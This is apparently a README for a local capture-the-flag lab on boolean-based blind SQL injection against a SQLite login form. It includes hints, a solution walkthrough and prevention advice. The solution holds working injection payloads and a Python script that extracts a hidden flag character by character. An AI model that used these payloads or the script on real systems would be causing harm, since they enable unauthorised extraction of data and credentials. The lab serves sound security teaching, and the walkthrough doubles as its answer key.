# SQL Injection Lab - Boolean-Based Blind Injection

## 📚 Description

This lab demonstrates a **Boolean-Based Blind SQL Injection** vulnerability where sensitive data (the flag) must be extracted character by character by observing TRUE/FALSE differences in the application's responses. No error messages are shown - you must rely on response variations.

**Difficulty Level:** Easy
**Technique:** Boolean-Based SQL Injection (Content Difference)

## 🎯 Learning Objectives

After completing this lab, you will understand:

1. How boolean-based blind SQL injection works
2. How to extract data using TRUE/FALSE responses
3. Using SQL functions like `SUBSTRING()`, `ASCII()`, `LENGTH()`
4. Binary search techniques for efficient data extraction
5. How response differences leak information

## 🚀 How to Run

```bash
cd /home/labuser/tools/lab-sql/lab-sqli-boolean
./start.sh
```

## 🎮 Challenge

Extract the flag from the hidden `admin_tokens` table by observing differences in the application's responses to your SQL injection payloads.

### What You Know

- Two response types:
  - **"Username exists but password is incorrect"** = TRUE (username found)
  - **"Username not found in our system"** = FALSE (username not found)
- The flag is in `admin_tokens` table
- No error messages are displayed
- Must extract data character by character

### Response Mapping

| Injection Result | Response | Type |
|-----------------|-----------|-------|
| Username exists | "Username exists but password is incorrect" | TRUE (warning) |
| Username doesn't exist | "Username not found in our system" | FALSE (error) |

## 💡 Hints

<details>
<summary>Hint 1: Understanding Boolean Injection</summary>

In boolean-based injection, you ask the database yes/no questions and observe the response differences to extract data bit by bit.
</details>

<details>
<summary>Hint 2: Testing a Condition</summary>

Use AND to inject a condition:
```
username: test' AND 1=1 --
```
- If TRUE: "Username exists but password is incorrect"
- If FALSE: "Username not found"
</details>

<details>
<summary>Hint 3: Discovering Table Names</summary>

Query sqlite_master to find tables:
```
username: existing_user' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='admin_tokens') > 0 --
```
</details>

<details>
<summary>Hint 4: Getting Flag Length</summary>

Use LENGTH() to find how long the flag is:
```
username: existing_user' AND LENGTH((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag')) > 10 --
```
</details>

<details>
<summary>Hint 5: Extracting Characters</summary>

Use SUBSTRING() to extract one character at a time:
```
username: existing_user' AND SUBSTRING((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag'), 1, 1) = 'I' --
```
</details>

<details>
<summary>Hint 6: Using ASCII Values</summary>

Convert characters to ASCII for numeric comparison:
```
username: existing_user' AND ASCII(SUBSTRING((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag'), 1, 1)) > 65 --
```
</details>

## 🔧 Solution Walkthrough

<details>
<summary>Click to reveal the solution</summary>

### Step 1: Find Existing Username

First, test if a known username exists:
```
username: john_member
password: anything
```
Response: "Username exists but password is incorrect" (yellow warning)

This confirms `john_member` exists and will be our base for boolean injection.

### Step 2: Verify Hidden Table Exists

```
username: john_member' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='admin_tokens') > 0 --
password: anything
```
Response: "Username exists but password is incorrect" → TRUE → Table exists!

### Step 3: Find Flag Length

Use binary search to find the length:

```
username: john_member' AND LENGTH((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag')) > 20 --
```

Keep testing until you find the exact length (typically 37 for `IDS{32-char-hex}`).

### Step 4: Extract Flag Character by Character

For position 1:
```
username: john_member' AND ASCII(SUBSTRING((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag'), 1, 1)) = 73 --
```
(73 is ASCII for 'I')

If response is "Username exists" → character match!
If response is "Username not found" → try different ASCII value

### Automated Python Script

```python
import requests

url = "http://localhost:PORT/"
base_username = "john_member"
base_password = "test"

def test_condition(condition):
    payload = f"{base_username}' AND {condition} --"
    data = {"username": payload, "password": base_password}
    r = requests.post(url, data=data)
    return "exists but password" in r.text

# Get flag length
length = 1
while test_condition(f"LENGTH((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag')) >= {length}"):
    length += 1
length -= 1
print(f"Flag length: {length}")

# Extract flag character by character
flag = ""
for pos in range(1, length + 1):
    for ascii_val in range(32, 127):
        if test_condition(f"ASCII(SUBSTRING((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag'), {pos}, 1)) = {ascii_val}"):
            flag += chr(ascii_val)
            print(f"Position {pos}: {chr(ascii_val)} ({ascii_val})")
            break

print(f"\nFlag: {flag}")
```

### Working Manual Payload Examples

**Check if first character is 'I' (ASCII 73):**
```
john_member' AND ASCII(SUBSTRING((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag'), 1, 1)) = 73 --
```

**Check if first character ASCII is greater than 65:**
```
john_member' AND ASCII(SUBSTRING((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag'), 1, 1)) > 65 --
```

</details>

## 🏁 Success Criteria

- [ ] You identified the boolean response behavior
- [ ] You discovered the `admin_tokens` table
- [ ] You determined the flag length
- [ ] You extracted the full flag character by character
- [ ] You understand how boolean injection works

## 🛡️ Prevention

Boolean-based SQL injection can be prevented by:

1. **Using Prepared Statements**:
```php
$stmt = $pdo->prepare("SELECT * FROM members WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

2. **Generic Error Messages** - Don't reveal if username exists

3. **Consistent Responses** - Return same message for both wrong username and wrong password

4. **Rate Limiting** - Slow down automated extraction attempts

## 📝 Notes

- This lab is for **educational purposes only**
- The flag is dynamically generated
- No error messages are shown (true blind injection)
- Automated scripts are recommended for full extraction
- Manual extraction is very time-consuming

---

**Author:** IDS – CyberSec Academy Lab Authoring Guideline
